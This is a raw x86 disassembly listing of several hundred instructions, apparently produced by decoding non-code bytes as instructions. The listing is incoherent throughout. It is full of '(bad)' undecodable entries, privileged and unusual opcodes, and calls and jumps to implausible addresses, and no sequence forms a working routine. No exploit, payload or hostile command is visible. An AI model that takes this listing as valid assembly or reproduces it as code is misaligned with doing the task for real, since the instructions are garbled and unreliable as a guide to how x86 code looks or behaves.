  414aae:	mov    DWORD PTR [edi],ecx
  414ab0:	adc    BYTE PTR [eax+0x45],al
  414ab3:	mov    ebp,eax
  414ab5:	mov    ebp,edi
  414ab7:	lock call edx
  414aba:	fcom   DWORD PTR [ebp+0x45]
  414abd:	mov    eax,0x148a8b
  414ac2:	push   ecx
  414ac3:	enter  0xc145,0x83
  414ac7:	cmp    ecx,DWORD PTR [eax]
  414ac9:	add    BYTE PTR [ebp+0x4d],al
  414acc:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  414ad2:	call   0xffa14641
  414ad7:	cmp    eax,DWORD PTR [ebp-0xc]
  414ada:	jmp    DWORD PTR [eax+edx*1-0x4e]
  414ade:	push   ebp
  414adf:	(bad)  
  414ae0:	call   0x3248e4
  414ae5:	mov    bh,0xdb
  414ae7:	cld    
  414ae8:	or     BYTE PTR [ebp+0x45],bl
  414aeb:	(bad)  
  414aec:	call   0xff7b477c
  414af1:	add    al,BYTE PTR [ebp+0x37]
  414af4:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  414afa:	jne    0x414afc
  414afc:	(bad)  
  414afd:	cmp    edi,esp
  414aff:	jne    0x414b32
  414b01:	mov    edi,edi
  414b03:	or     BYTE PTR [ebx-0x307f0b49],cl
  414b09:	pop    ds
  414b0a:	into   
  414b0b:	je     0x414ace
  414b0d:	mov    ebx,DWORD PTR [esi]
  414b0f:	or     BYTE PTR [ebp-0x49],al
  414b12:	mov    esp,DWORD PTR [esi-0x77]
  414b15:	mov    esi,0x4451f0c
  414b1a:	mov    eax,DWORD PTR [eax]
  414b1c:	or     al,0x66
  414b1e:	sar    bl,0x3b
  414b21:	xor    esi,DWORD PTR [ebp+0x66]
  414b24:	xor    ecx,edi
  414b26:	pop    edi
  414b27:	adc    bl,BYTE PTR [ebx+0x70]
  414b2a:	ret    0xff
  414b2d:	cld    
  414b2e:	inc    ebp
  414b2f:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  414b35:	cld    
  414b36:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  414b3d:	push   0xffffff83
  414b3f:	pop    edi
  414b40:	or     BYTE PTR [ebp+0x53],dh
  414b43:	xorps  xmm1,xmm2
  414b46:	test   BYTE PTR [eax+eax*1],bh
  414b49:	add    BYTE PTR [eax],al
  414b4b:	adc    eax,eax
  414b4d:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  414b55:	jmp    DWORD PTR [eax]
  414b57:	ror    al,0x5e
  414b5a:	inc    ebp
  414b5b:	leave  
  414b5c:	xor    ecx,DWORD PTR [eax]
  414b5e:	and    DWORD PTR [ebx-0x3ec10708],ecx
  414b64:	add    ah,al
  414b66:	xor    edi,edi
  414b68:	xor    DWORD PTR [ebx],0x66003304
  414b6e:	mov    DWORD PTR [ebp-0xc],ecx
  414b71:	pcmpgtw mm0,mm0
  414b74:	add    dl,ah
  414b76:	leave  
  414b77:	mov    edi,DWORD PTR [esi-0x7d]
  414b7a:	push   ax
  414b7c:	dec    ebp
  414b7d:	mov    esi,DWORD PTR [ebx-0x75]
  414b80:	lea    ebp,[eax-0x7c00ff04]
  414b86:	xor    eax,DWORD PTR [eax]
  414b88:	sysret 
  414b8a:	dec    ebp
  414b8b:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  414b92:	push   WORD PTR [ecx+0x8]
  414b96:	jne    0x414b59
  414b98:	ud0    ecx,DWORD PTR [ecx]
  414b9b:	mov    eax,edx
  414b9d:	lods   al,BYTE PTR ds:[esi]
  414b9e:	add    BYTE PTR [eax],al
  414ba0:	data16 (bad) 
  414ba2:	iret   
  414ba3:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  414baa:	cli    
  414bab:	inc    ebp
  414bac:	cmp    al,0x8d
  414bae:	add    BYTE PTR [esi+0x2d],ah
  414bb1:	inc    ebp
  414bb2:	pop    ebp
  414bb3:	lea    ecx,[edi]
  414bb5:	mov    dl,bh
  414bb7:	add    BYTE PTR [edi],cl
  414bb9:	mov    DWORD PTR [eax+eax*8],edi
  414bbc:	mov    ebx,0x3b87
  414bc1:	add    BYTE PTR [ebx],ch
  414bc3:	inc    ebp
  414bc4:	data16 (bad) 
  414bc6:	clc    
  414bc7:	int3   
  414bc8:	cmp    eax,DWORD PTR [eax]
  414bca:	je     0x414b55
  414bcc:	push   0xffffffc8
  414bce:	pop    edi
  414bcf:	xchg   DWORD PTR [ebp+0x0],eax
  414bd2:	data16 add BYTE PTR [ebp+0x45],cl
  414bd6:	lea    cx,[ebp+0x10]
  414bda:	jb     0x414bdc
  414bdc:	jmp    0x414b67
  414bde:	call   eax
  414be0:	clc    
  414be1:	xchg   DWORD PTR [edi+0x1],edi
  414be4:	mov    eax,DWORD PTR [eax]
  414be6:	or     BYTE PTR [ebp-0x49],al
  414be9:	lea    eax,[eax+0x74003154]
  414bef:	push   edi
  414bf0:	inc    edx
  414bf1:	jge    0x414bf2
  414bf3:	mov    DWORD PTR [edi],ecx
  414bf5:	fdiv   DWORD PTR [edi-0x6]
  414bf8:	inc    DWORD PTR [eax]
  414bfa:	xor    edx,DWORD PTR [eax+0x5f]
  414bfd:	xchg   DWORD PTR [ebx+0x1],ebx
  414c00:	ret    0x0
  414c03:	xor    BYTE PTR [ebp-0x51],cl
  414c06:	cmp    edi,0xf0ff89fc
  414c0c:	data16 ror al,0x84
  414c10:	rol    BYTE PTR [eax],0x3b
  414c13:	add    al,dh
  414c15:	dec    eax
  414c16:	xchg   esp,eax
  414c17:	push   ebx
  414c18:	jmp    0x414ba5
  414c1a:	push   ebp
  414c1b:	add    esp,ebp
  414c1d:	add    ebp,esp
  414c1f:	mov    edx,DWORD PTR [edi+0x24]
  414c22:	clc    
  414c23:	dec    esi
  414c24:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  414c2a:	cmp    BYTE PTR [ebx],al
  414c2c:	jne    0x414bb7
  414c2e:	xor    esp,eax
  414c30:	jmp    0x444db3
  414c35:	add    ebp,DWORD PTR [ecx+ecx*4]
  414c38:	jne    0x414c2e
  414c3a:	call   0xffcb4994
  414c3f:	clc    
  414c40:	xchg   edi,eax
  414c41:	sti    
  414c42:	add    DWORD PTR [ebx],eax
  414c44:	add    BYTE PTR [ebp+0x47],bl
  414c47:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  414c4d:	pop    ebp
  414c4e:	mov    DWORD PTR [esi-0x48],esi
  414c51:	jmp    0x414c9a
  414c53:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  414c59:	(bad)  
  414c5b:	cmp    al,0x0
  414c5d:	cmp    eax,DWORD PTR [ebp+0x18]
  414c60:	lea    ebx,[ebp-0x56]
  414c63:	jle    0x414c65
  414c65:	jae    0x414bf0
  414c67:	mov    eax,esp
  414c69:	call   0xb900:0x8b005587
  414c70:	inc    ebp
  414c71:	push   ebp
  414c72:	lea    ecx,[ebp-0x27ff4f12]
  414c78:	mov    eax,edi
  414c7a:	int3   
  414c7b:	push   ebp
  414c7c:	xchg   edi,eax
  414c7e:	add    esp,ebp
  414c80:	add    BYTE PTR [eax],al
  414c82:	inc    ebp
  414c83:	add    BYTE PTR [ebp+0x8b3255],cl
  414c89:	cld    
  414c8a:	mov    DWORD PTR [edx],edi
  414c8c:	aam    0x75
  414c8e:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  414c94:	mov    DWORD PTR [ebx-0x50],edx
  414c97:	test   BYTE PTR [ebp-0x1],0xe8
  414c9b:	mov    eax,DWORD PTR [eax]
  414c9d:	hlt    
  414c9e:	add    al,al
  414ca0:	mov    eax,DWORD PTR ds:0x890045a8
  414ca6:	dec    DWORD PTR [ebx+0x45fdf0e8]
  414cac:	inc    DWORD PTR [eax*2+0xf75854d]
  414cb3:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  414cb9:	call   0x7297a9fa
  414cbe:	je     0x414d1e
  414cc0:	js     0x414d21
  414cc2:	lock ret 0x7e
  414cc6:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  414ccc:	mov    edi,edi
  414cce:	sbb    al,bl
  414cd0:	clc    
  414cd1:	add    BYTE PTR [ebp-0x73],bh
  414cd4:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  414cda:	ror    BYTE PTR [eax],1
  414cdc:	dec    ebp
  414cdd:	xchg   ebp,eax
  414cde:	mov    edi,edi
  414ce0:	in     al,0x8b
  414ce2:	jge    0x414c6d
  414ce4:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  414cea:	clc    
  414ceb:	pop    esi
  414cec:	fist   DWORD PTR [ebp+0x5d398b5d]
  414cf2:	clc    
  414cf3:	add    al,0x6e
  414cf5:	mov    eax,DWORD PTR [ebx]
  414cf7:	mov    BYTE PTR [ebp+0x0],dl
  414cfa:	mov    edx,DWORD PTR [ebx-0x20]
  414cfd:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  414d03:	add    eax,0x3b3b73
  414d08:	adc    al,0x89
  414d0a:	pop    eax
  414d0b:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  414d0f:	ret    0xf08
  414d12:	cmp    al,0x2
  414d14:	mov    edx,eax
  414d16:	cld    
  414d17:	add    BYTE PTR [ebp+0x66],dl
  414d1a:	add    eax,ebx
  414d1c:	add    esp,eax
  414d1e:	sub    eax,eax
  414d20:	or     BYTE PTR [ecx-0x77f474bb],cl
  414d26:	add    BYTE PTR [eax],al
  414d28:	mov    DWORD PTR [ebx-0x24],ebx
  414d2b:	push   edi
  414d2c:	push   ebp
  414d2d:	clc    
  414d2e:	add    DWORD PTR [esi+0x1b0100],0x45
  414d35:	out    0xff,eax
  414d37:	add    edx,DWORD PTR [eax]
  414d39:	jmp    0x414d23
  414d3b:	cmp    ch,0x47
  414d3e:	(bad)  
  414d3f:	jmp    0x40c6d591
  414d44:	je     0x414cd0
  414d46:	mov    eax,DWORD PTR [eax-0x10c78f04]
  414d4c:	inc    ebp
  414d4d:	add    BYTE PTR [ebx-0x770375],al
  414d53:	add    ah,ch
  414d55:	add    edx,esp
  414d57:	pop    edi
  414d58:	pop    ebp
  414d59:	push   ebp
  414d5a:	inc    ebx
  414d5b:	in     al,dx
  414d5c:	pop    ebp
  414d5d:	in     al,dx
  414d5e:	cmp    edx,DWORD PTR [edi-0x8]
  414d61:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  414d68:	add    al,0x47
  414d6a:	push   ebp
  414d6b:	mov    esp,ebp
  414d6d:	in     al,0x45
  414d6f:	dec    ebp
  414d70:	push   esi
  414d71:	test   DWORD PTR [eax+0xfb010f],esi
  414d77:	add    BYTE PTR [eax+0xc018b],dh
  414d7d:	leave  
  414d7e:	inc    ebp
  414d7f:	test   al,ch
  414d81:	add    dh,bh
  414d83:	add    bh,bh
  414d85:	dec    ebp
  414d86:	push   cs
  414d87:	mov    DWORD PTR [ecx],eax
  414d89:	hlt    
  414d8a:	push   es
  414d8b:	dec    ebp
  414d8c:	leave  
  414d8d:	mov    DWORD PTR [eax],ecx
  414d8f:	clc    
  414d90:	cmovge eax,ecx
  414d93:	mov    ecx,0x85c2f0
  414d99:	clc    
  414d9a:	pop    DWORD PTR [ebp+0x1]
  414d9d:	push   ebx
  414d9e:	add    BYTE PTR [ebp-0x15],bh
  414da1:	push   esi
  414da2:	xor    eax,0x898a45
  414da7:	cld    
  414da8:	add    al,0x45
  414daa:	add    BYTE PTR [ebx],dh
  414dac:	pushfw 
  414dae:	add    DWORD PTR [esi+0x78308c1],edi
  414db4:	add    ah,BYTE PTR [edi+esi*4-0x33]
  414db8:	mov    ebx,0xc4e8b
  414dbd:	(bad)  
  414dbe:	cmp    ecx,ebx
  414dc0:	jne    0x414d8a
  414dc2:	xor    ecx,DWORD PTR [ebp+0x66]
  414dc5:	jmp    0xc84dcb
  414dca:	add    DWORD PTR [ebp+0x0],eax
  414dcd:	mov    eax,ebx
  414dcf:	or     al,0x8b
  414dd1:	(bad)  
  414dd2:	mov    ecx,esi
  414dd4:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  414ddb:	mov    eax,edi
  414ddd:	or     BYTE PTR [edx],cl
  414ddf:	shl    cl,cl
  414de1:	icebp  
  414de2:	add    BYTE PTR [ebp+0x37],0x8b
  414de6:	or     BYTE PTR [edx+eax*2],cl
  414de9:	(bad)  
  414dea:	or     cl,dh
  414dec:	stc    
  414ded:	shl    DWORD PTR [ebp-0x30],0xc6
  414df1:	xor    al,0x0
  414df3:	inc    ebp
  414df4:	xchg   BYTE PTR [ebx],al
  414df6:	add    esp,edi
  414df8:	add    BYTE PTR [ebp-0x39],cl
  414dfb:	mov    al,bl
  414dfd:	test   DWORD PTR [ebx+0x1c348375],ecx
  414e03:	sub    al,0xbf
  414e05:	jmp    0x414d8c
  414e07:	mov    edi,eax
  414e09:	lock jge 0x414dfd
  414e0c:	lea    esi,[edx-0x74bad501]
  414e12:	mov    ebp,esp
  414e14:	or     cl,dh
  414e16:	leave  
  414e17:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  414e1e:	dec    ebp
  414e1f:	dec    ebp
  414e20:	test   DWORD PTR [ebx],eax
  414e22:	paddb  mm6,mm0
  414e25:	add    DWORD PTR [eax],eax
  414e27:	dec    ebp
  414e28:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  414e2e:	mov    esi,DWORD PTR [edx]
  414e30:	or     al,0x2b
  414e32:	dec    ebp
  414e33:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  414e39:	mov    esp,esi
  414e3b:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  414e42:	mov    DWORD PTR [ebx],ebp
  414e44:	call   0xc74d774
  414e49:	mov    DWORD PTR [ebp+0x10],ecx
  414e4c:	(bad)  
  414e4d:	push   0x8b85ff10
  414e52:	clc    
  414e53:	or     al,0x55
  414e55:	(bad)  
  414e56:	push   ecx
  414e57:	retf   
  414e58:	mov    ebx,0xff4d8dc8
  414e5d:	mov    DWORD PTR [ebp+0x8],eax
  414e60:	xor    eax,DWORD PTR [ebp-0x75]
  414e63:	cmp    ebp,DWORD PTR [ebx]
  414e65:	lsl    ebx,WORD PTR [edi-0x8]
  414e69:	call   DWORD PTR [ebx-0x741bff75]
  414e6f:	(bad)  
  414e70:	or     al,0x5b
  414e72:	dec    ebp
  414e73:	or     BYTE PTR [ebx],dh
  414e75:	inc    ebp
  414e76:	xor    esi,DWORD PTR ds:0x708088d
  414e7c:	in     eax,0x9c
  414e7e:	add    BYTE PTR [edx],dh
  414e80:	inc    ebp
  414e81:	pop    edi
  414e82:	xor    eax,edx
  414e84:	test   DWORD PTR [eax],0x83108b8b
  414e8a:	dec    ebp
  414e8b:	adc    al,0x33
  414e8d:	inc    ebp
  414e8e:	xor    esi,DWORD PTR [ecx]
  414e90:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  414e97:	test   DWORD PTR [eax],ecx
  414e99:	clc    
  414e9a:	inc    ebp
  414e9b:	add    ecx,DWORD PTR [ebx+0xc7f445]
  414ea1:	hlt    
  414ea2:	leave  
  414ea3:	test   DWORD PTR [esi],eax
  414ea5:	clc    
  414ea6:	inc    edi
  414ea7:	push   edi
  414ea8:	aaa    
  414ea9:	inc    ebp
  414eaa:	pop    ss
  414eab:	ror    DWORD PTR [ebp-0x29],1
  414eae:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  414eb5:	mov    eax,0x780084d
  414eba:	push   ebp
  414ebb:	clc    
  414ebc:	ret    0xe99c
  414ebf:	xor    dl,dl
  414ec1:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  414ec7:	js     0x887dac6
  414ecd:	dec    ebp
  414ece:	push   ebp
  414ecf:	mov    edi,DWORD PTR [eax+0xc872fc]
  414ed5:	lock enter 0xceca,0xf2
  414eda:	retf   0x18ce
  414edd:	jne    0x414f2c
  414edf:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  414ee5:	enter  0xf0d6,0xca
  414ee9:	retf   0xf2c8
  414eec:	into   
  414eed:	out    dx,al
  414eee:	dec    ebp
  414eef:	dec    ebp
  414ef0:	jmp    0xff454e28
  414ef5:	xor    eax,DWORD PTR [ebp-0x15]
  414ef8:	xor    esi,DWORD PTR [ebx]
  414efa:	mov    esi,DWORD PTR [ebx]
  414efc:	sub    eax,DWORD PTR [ebx]
  414efe:	add    eax,DWORD PTR [ebx]
  414f00:	or     bl,dl
  414f02:	dec    ebp
  414f03:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  414f09:	xor    eax,DWORD PTR [ebp-0xf00073]
  414f0f:	jb     0x414f56
  414f11:	add    BYTE PTR [ebx],dh
  414f13:	dec    ebp
  414f14:	pop    esi
  414f15:	mov    ebp,ebx
  414f17:	cld    
  414f18:	mov    esi,eax
  414f1a:	call   0x520fa4e7
  414f1f:	stc    
  414f20:	add    eax,0x4572aa
  414f25:	pop    edi
  414f26:	leave  
  414f27:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  414f2e:	in     al,dx
  414f2f:	mov    eax,edi
  414f31:	xor    eax,0xf8008520
  414f37:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  414f3e:	mov    eax,DWORD PTR [ebp-0x77]
  414f41:	xor    al,bh
  414f43:	pushf  
  414f44:	inc    ebp
  414f45:	(bad)  
  414f46:	cmp    eax,ebp
  414f48:	pushf  
  414f49:	xchg   BYTE PTR [esi-0x8],dl
  414f4c:	mov    edi,0x8518e4ec
  414f52:	jmp    0xf056:0x8b457df8
  414f59:	push   ebp
  414f5a:	push   ebp
  414f5b:	push   ecx
  414f5c:	push   ecx
  414f5d:	push   edi
  414f5e:	xor    eax,esi
  414f60:	mov    edx,0x32729c
  414f65:	add    ecx,eax
  414f67:	mov    edx,edi
  414f69:	clc    
  414f6a:	retf   0xaf45
  414f6d:	cmp    ebx,ebp
  414f6f:	pushf  
  414f70:	mov    eax,edi
  414f72:	clc    
  414f73:	cld    
  414f74:	jne    0x414f8e
  414f76:	xor    ebp,edx
  414f78:	xor    eax,DWORD PTR [ebp+0x3]
  414f7b:	or     BYTE PTR [ebx],al
  414f7d:	add    BYTE PTR [ebp-0x7747475],al
  414f83:	hlt    
  414f84:	dec    ebp
  414f85:	dec    ebp
  414f86:	je     0x414fbb
  414f88:	xor    esi,DWORD PTR [ebx]
  414f8a:	xor    eax,DWORD PTR [ebx]
  414f8c:	add    eax,DWORD PTR [ebx]
  414f8e:	add    ecx,DWORD PTR [edi]
  414f90:	rol    ecx,cl
  414f92:	mov    esi,DWORD PTR [ecx]
  414f94:	in     al,dx
  414f95:	inc    ebp
  414f96:	enter  0xca2b,0x33
  414f9a:	icebp  
  414f9b:	mov    DWORD PTR [edx],ecx
  414f9d:	clc    
  414f9e:	lock pop ebp
  414fa0:	enter  0xf2e8,0xfe
  414fa4:	retf   0xeeff
  414fa7:	inc    ebp
  414fa8:	jne    0x414f35
  414faa:	mov    edi,eax
  414fac:	cld    
  414fad:	dec    ebp
  414fae:	enter  0xbc89,0x8d
  414fb2:	pushf  
  414fb3:	sti    
  414fb4:	xor    bh,bh
  414fb6:	mov    eax,DWORD PTR [ebp-0xc]
  414fb9:	mov    esi,DWORD PTR [ebp-0x4]
  414fbc:	xor    eax,esi
  414fbe:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  414fc5:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  414fcb:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  414fd1:	(bad)  
  414fd2:	push   ebp
  414fd3:	shr    esp,0x4d
  414fd6:	in     al,dx
  414fd7:	cmp    eax,DWORD PTR [esi+esi*2]
  414fda:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  414fe0:	pushf  
  414fe1:	mov    edi,0x85c7f445
  414fe7:	call   0xf886d6e4
  414fec:	xor    ebx,ebx
  414fee:	pushf  
  414fef:	popa   
  414ff0:	push   ebx
  414ff1:	dec    ebp
  414ff2:	inc    ebp
  414ff3:	mov    esi,DWORD PTR [esi]
  414ff5:	clc    
  414ff6:	pushf  
  414ff7:	into   
  414ff8:	mov    ecx,edi
  414ffa:	in     al,dx
  414ffb:	call   0x8b4995be
  415000:	pop    es
  415001:	or     BYTE PTR [ebx],dh
  415003:	or     BYTE PTR [edi+0x8a724d],bh
  415009:	or     eax,edi
  41500b:	push   ebp
  41500c:	inc    ebp
  41500d:	cmpxchg8b (bad)
  41500e:	(bad)  
  41500f:	leave  
  415010:	loopne 0x414fdc
  415012:	test   DWORD PTR [ebp-0x8],ecx
  415015:	mov    eax,DWORD PTR [ebp-0x18]
  415018:	rcl    DWORD PTR [ebp-0x29],1
  41501b:	xor    eax,edi
  41501d:	add    esi,eax
  41501f:	and    eax,DWORD PTR [eax]
  415021:	mov    eax,DWORD PTR [eax]
  415023:	(bad)  
  415024:	leave  
  415025:	sti    
  415026:	inc    ebp
  415027:	dec    DWORD PTR [ebx-0x39cc13ab]
  41502d:	mov    esi,ecx
  41502f:	clc    
  415030:	(bad)  
  415031:	dec    ebp
  415032:	iret   
  415033:	xor    ebp,DWORD PTR [edi-0x74f71473]
  415039:	jb     0x415037
  41503b:	add    bh,al
  41503d:	inc    ebp
  41503e:	(bad)  
  41503f:	mov    eax,DWORD PTR [ebp-0xc]
  415042:	(bad)  
  415043:	xabort 0x64
  415046:	loopne 0x415015
  415048:	jmp    FWORD PTR [ebx]
  41504a:	mov    DWORD PTR [ebx],eax
  41504c:	clc    
  41504d:	lock inc ebp
  41504f:	dec    ebp
  415050:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  415056:	loopne 0x41508b
  415058:	inc    DWORD PTR [ebx]
  41505a:	mov    edi,DWORD PTR [ebx]
  41505c:	hlt    
  41505d:	jne    0x4150ac
  41505f:	mov    esi,DWORD PTR [ebx]
  415061:	in     al,0x8d
  415063:	dec    ebp
  415064:	or     BYTE PTR [ebx],dh
  415066:	jb     0x41506b
  415068:	add    BYTE PTR [edi+0x45],bl
  41506b:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  415071:	add    BYTE PTR [ebx],dh
  415073:	mov    esi,DWORD PTR [ebx]
  415075:	sub    DWORD PTR [ebx],0x6c
  415078:	mov    eax,DWORD PTR [ebp-0x4]
  41507b:	xor    eax,ecx
  41507d:	pushf  
  41507e:	mov    ecx,0x338545ba
  415083:	clc    
  415084:	add    edx,DWORD PTR [ebp-0x77]
  415087:	mov    edi,eax
  415089:	adc    al,0x45
  41508b:	inc    ebp
  41508c:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  415094:	mov    eax,DWORD PTR [eax]
  415096:	loopne 0x4150e5
  415098:	inc    ebp
  415099:	mov    esi,DWORD PTR [ebx]
  41509b:	mov    eax,DWORD PTR [ebx]
  41509d:	nop
  41509e:	rol    DWORD PTR [eax],cl
  4150a0:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  4150a6:	mov    cl,BYTE PTR [ecx+0x450bf888]
  4150ac:	dec    ebp
  4150ad:	push   esi
  4150ae:	mov    edi,DWORD PTR [edi+0x7b608f8]
  4150b4:	xor    eax,edi
  4150b6:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  4150bd:	mov    DWORD PTR [eax],ecx
  4150bf:	in     al,dx
  4150c0:	into   
  4150c1:	inc    ebp
  4150c2:	iret   
  4150c3:	xor    ecx,edx
  4150c5:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  4150cc:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  4150d2:	dec    ebp
  4150d3:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  4150d9:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  4150e0:	mov    DWORD PTR [ecx+0x8],eax
  4150e3:	mov    eax,DWORD PTR [ebp-0x8]
  4150e6:	xor    ebx,DWORD PTR [eax]
  4150e8:	mov    ecx,0xff8b8d40
  4150ed:	clc    
  4150ee:	enter  0x4d49,0x48
  4150f2:	mov    eax,edx
  4150f4:	lock enter 0x4545,0x8b
  4150f9:	mov    esi,eax
  4150fb:	cmp    dh,al
  4150fd:	rol    edi,0x3
  415100:	enter  0x9140,0x89
  415104:	inc    ebp
  415105:	adc    al,0x8b
  415107:	inc    ebp
  415108:	clc    
  415109:	xor    eax,esi
  41510b:	add    eax,edi
  41510d:	mov    DWORD PTR [esi-0x24],ebx
  415110:	rol    DWORD PTR [ebp-0x37],0x33
  415114:	add    al,0x3
  415116:	push   ebp
  415117:	mov    esp,ebp
  415119:	fsubr  st,st(4)
  41511b:	inc    ebp
  41511c:	(bad)  
  41511d:	mov    edi,esp
  41511f:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  415125:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41512c:	inc    ebp
  41512d:	test   DWORD PTR [ecx+0x454514f8],ecx
  415133:	xor    cl,BYTE PTR [ebx+0xc7909c]
  415139:	fmul   DWORD PTR [ebx+0xf81485]
  41513f:	test   DWORD PTR [ecx+0x8b0100],ecx
  415145:	cld    
  415146:	or     edi,eax
  415148:	dec    eax
  415149:	ret    
  41514a:	push   ebx
  41514b:	inc    ebp
  41514c:	dec    ebp
  41514d:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  415153:	mov    DWORD PTR [ebp-0x14],edx
  415156:	push   ecx
  415157:	jne    0x41518c
  415159:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41515f:	call   0xff874327
  415164:	mov    eax,DWORD PTR [ebp-0x4]
  415167:	mov    edi,0x4585c3d8
  41516d:	clc    
  41516e:	mov    eax,DWORD PTR [ebp-0x8]
  415171:	xor    eax,DWORD PTR [eax+0x3]
  415174:	adc    DWORD PTR [eax+0xc],0x45
  415178:	inc    ebp
  415179:	push   eax
  41517a:	mov    ebx,ebp
  41517c:	clc    
  41517d:	inc    DWORD PTR [eax-0x75]
  415180:	mov    esi,eax
  415182:	clc    
  415183:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41518a:	je     0x41518f
  41518c:	mov    edx,DWORD PTR [eax+0x38]
  41518f:	jne    0x4151de
  415191:	lea    ecx,[ebx-0x817ab44]
  415197:	mul    BYTE PTR [ebx]
  415199:	dec    DWORD PTR [ebx+0x4089f845]
  41519f:	fadd   DWORD PTR [ebx]
  4151a1:	inc    ebp
  4151a2:	jmp    0x41512f
  4151a4:	mov    ecx,DWORD PTR [esp+edx*2]
  4151a7:	rol    DWORD PTR [ebp+0x45],0x8b
  4151ab:	mov    edi,esp
  4151ad:	lock (bad) 
  4151af:	dec    ebp
  4151b0:	ret    
  4151b1:	mov    eax,DWORD PTR [ebp+0x10]
  4151b4:	mov    eax,DWORD PTR [ecx-0x4]
  4151b7:	mov    eax,edi
  4151b9:	fadd   st,st(3)
  4151bb:	enter  0x1645,0x8b
  4151bf:	inc    ebp
  4151c0:	cld    
  4151c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4151c4:	xor    ecx,DWORD PTR [ebp+0x3]
  4151c7:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  4151cd:	sub    eax,DWORD PTR [ebp-0x17]
  4151d0:	xor    eax,DWORD PTR [edx]
  4151d2:	pushf  
  4151d3:	add    bh,al
  4151d5:	or     al,0xd8
  4151d7:	jne    0x41515e
  4151d9:	(bad)  
  4151da:	clc    
  4151db:	mov    al,0x45
  4151dd:	call   0xffde481f
  4151e2:	jmp    0xdd5518
  4151e7:	mov    DWORD PTR [ebp-0x30],eax
  4151ea:	xor    eax,DWORD PTR [ebp+0x3]
  4151ed:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  4151f3:	enter  0x8503,0xc
  4151f7:	clc    
  4151f8:	inc    ebp
  4151f9:	inc    ebp
  4151fa:	push   DWORD PTR [edx]
  4151fc:	in     al,dx
  4151fd:	pushf  
  4151fe:	jne    0x41518d
  415200:	mov    edx,eax
  415202:	clc    
  415203:	dec    ebp
  415204:	out    dx,eax
  415205:	(bad)  
  415206:	dec    esp
  415208:	mov    DWORD PTR [ebp-0x10],ecx
  41520b:	lea    eax,[ebp-0x38]
  41520e:	cmp    DWORD PTR [ebp-0x64],ecx
  415211:	lea    ecx,[ebx-0x38b2273c]
  415217:	mov    eax,ebx
  415219:	cld    
  41521a:	(bad)  
  41521b:	iret   
  41521c:	mov    esp,0xf74de8cb
  415221:	jmp    0x865425
  415226:	test   DWORD PTR [ebx],esi
  415228:	je     0x4151c6
  41522a:	mov    ecx,DWORD PTR [edi]
  41522c:	fdivr  st,st(6)
  41522e:	mov    DWORD PTR [eax],0xe8ff8bc3
  415234:	lock iret 
  415236:	inc    ebp
  415237:	lock push eax
  415239:	retf   
  41523a:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  415241:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  415248:	dec    ebp
  415249:	mov    DWORD PTR [ebx],ebp
  41524b:	fmul   DWORD PTR [ecx+0x458bd845]
  415251:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  415257:	enter  0x1303,0xc
  41525b:	inc    ebp
  41525c:	dec    ebp
  41525d:	xor    edi,DWORD PTR [ebx]
  41525f:	add    esi,DWORD PTR [edx+0x50]
  415262:	mov    ecx,DWORD PTR [eax+esi*8]
  415265:	inc    ebp
  415266:	inc    eax
  415267:	push   eax
  415268:	mov    ebp,esp
  41526a:	lock inc DWORD PTR [ecx-0x75]
  41526e:	mov    esp,esp
  415270:	fadd   DWORD PTR [eax]
  415272:	rol    edi,0xee
  415275:	test   BYTE PTR [eax],al
  415277:	dec    esp
  415278:	push   0x32
  41527a:	dec    DWORD PTR [ebx-0x30ba0314]
  415280:	push   eax
  415281:	mov    dh,0x21
  415283:	add    edi,edi
  415285:	cmp    edi,DWORD PTR [eax-0x7877af1]
